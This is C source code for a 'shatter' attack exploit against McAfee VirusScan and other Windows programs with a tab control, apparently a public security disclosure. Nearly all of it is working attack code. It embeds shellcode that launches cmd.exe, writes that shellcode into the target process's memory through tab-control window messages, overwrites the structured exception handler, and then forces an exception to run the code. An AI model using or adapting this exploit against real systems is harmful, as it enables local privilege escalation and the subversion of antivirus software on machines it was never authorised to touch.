/**********************************************************
* Tab Control Shatter exploit for McAfee A/V products
* (or any other program that includes a tab control)
*
* Demonstrates the use of tab control messages to;
* - inject shellcode to known location
* - overwrite 4 bytes of a critical memory address
*
* 3 Variables need to be set for proper execution.
* - tWindow is the title of the programs main window
* - sehHandler is the critical address to overwrite
* - shellcodeaddr is the data space to inject the code
*
* Hardcoded addresses are for XP SP 1
* Try it out against any program with a tab control.
* Oliver Lavery <oliver.lavery at sympatico.ca>
*
* Based on (and pretty much identical to) shatterseh2.c by
* Brett Moore [ brett moore security-assessment com ]
**********************************************************/
#include <windows.h>
#include <commctrl.h>
#include <stdio.h>

// Local Cmd Shellcode.
// Added a loadLibrary call to make sure msvcrt.dll is present -- ol
BYTE exploit[] =
"\x90\x68\x74\x76\x73\x6D\x68\x63\x72\x00\x00\x54\xB9\x61\xD9\xE7\x77\xFF\xD1\x68\x63\x6D\x64\x00\x54\xB9\x44\x80\xC2\x77\xFF\xD1\xCC";

char g_classNameBuf[ 256 ];

char tWindow[]="VirusScan Status";// The name of the main window
long sehHandler = 0x77edXXXX; // Critical Address To Overwrite
long shellcodeaddr = 0x77ed7484; // Known Writeable Space Or Global Space
// you might want to find a less destructive spot to stick the code, but
this works for me --ol
void doWrite(HWND hWnd, long tByte,long address);
void IterateWindows(long hWnd);

int main(int argc, char *argv[])
{
   long hWnd;
   HMODULE hMod;
   DWORD ProcAddr;
   printf("%% Playing with tabcontrol messages\n");
   printf("%% Oliver Lavery.\n\n");
   printf("%% based on Shatter SEH code by\n");
   printf("%% brett moore security-assessment com\n\n");

   // Find local procedure address
   hMod = LoadLibrary("kernel32.dll");
   ProcAddr = (DWORD)GetProcAddress(hMod, "LoadLibraryA");
   if(ProcAddr != 0)
      // And put it in our shellcode
      *(long *)&exploit[13] = ProcAddr;

   hMod = LoadLibrary("msvcrt.dll");
   ProcAddr = (DWORD)GetProcAddress(hMod, "system");
   if(ProcAddr != 0)
      // And put it in our shellcode
      *(long *)&exploit[26] = ProcAddr;

   printf("+ Finding %s Window...\n",tWindow);
   hWnd = (long)FindWindow(NULL,tWindow);
   if(hWnd == NULL)
   {
      printf("+ Couldn't Find %s Window\n",tWindow);
      return 0;
   }
   printf("+ Found Main Window At...0x%xh\n",hWnd);
   IterateWindows(hWnd);
   printf("+ Not Done...\n");
   return 0;
}


void doWrite(HWND hWnd, long tByte,long address)
{
   SendMessage( hWnd,(UINT) TCM_SETITEMSIZE,0,MAKELPARAM(tByte - 2, 20));
   SendMessage( hWnd,(UINT) TCM_GETITEMRECT,1,address);
}

void IterateWindows(long hWnd)
{
   long childhWnd,looper;
   childhWnd = (long)GetNextWindow((HWND)hWnd,GW_CHILD);
   GetClassName( (HWND)childhWnd, g_classNameBuf, sizeof(g_classNameBuf)
);
   while ( strcmp(g_classNameBuf, "SysTabControl32") )
   {
      IterateWindows(childhWnd);
      childhWnd = (long)GetNextWindow((HWND)childhWnd ,GW_HWNDNEXT);
          GetClassName( (HWND)childhWnd, g_classNameBuf,
sizeof(g_classNameBuf) );
   }

   if(childhWnd != NULL)
   {
          LONG wndStyle = GetWindowLong( (HWND)childhWnd, GWL_STYLE );
          wndStyle |= TCS_FIXEDWIDTH ;
          SetWindowLong( (HWND)childhWnd, GWL_STYLE, wndStyle );

          printf("min %d\n", SendMessage( (HWND)childhWnd,(UINT)
TCM_SETMINTABWIDTH, 0,(LPARAM)0) );

      printf("+ Found tab control..0x%xh\n",childhWnd);
      // Inject shellcode to known address

          printf("+ Sending shellcode to...0x%xh\n",shellcodeaddr);
      for (looper=0;looper<sizeof(exploit);looper++)
         doWrite((HWND)childhWnd, (long) exploit[looper],(shellcodeaddr +
looper));
      // Overwrite SEH
      printf("+ Overwriting Top SEH....0x%xh\n",sehHandler);
      doWrite((HWND)childhWnd, ((shellcodeaddr) & 0xff),sehHandler);
      doWrite((HWND)childhWnd, ((shellcodeaddr >> 8) &
0xff),sehHandler+1);
      doWrite((HWND)childhWnd, ((shellcodeaddr >> 16) &
0xff),sehHandler+2);
      doWrite((HWND)childhWnd, ((shellcodeaddr >> 24) &
0xff),sehHandler+3);
      // Cause exception
      printf("+ Forcing Unhandled Exception\n");
      SendMessage((HWND) childhWnd,(UINT) TCM_GETITEMRECT,0,1);
      printf("+ Done...\n");
      exit(0);
   }
}




